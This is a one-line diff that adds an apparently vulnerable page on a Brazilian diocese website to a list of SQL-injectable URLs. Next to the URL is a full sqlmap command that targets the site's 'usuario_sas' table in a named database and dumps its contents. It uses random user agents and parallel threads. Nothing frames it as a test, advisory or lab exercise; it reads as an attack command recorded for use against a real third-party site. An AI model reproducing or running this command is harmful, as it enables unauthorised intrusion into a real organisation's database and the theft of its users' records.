@@ -1,0 +1,1 @@
+http://www.diocesedecaceres.com.br/?pg=paroquias&id=27 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.diocesedecaceres.com.br/?pg=paroquias&id=27 -D diocesedecacer01 -T usuario_sas --dump
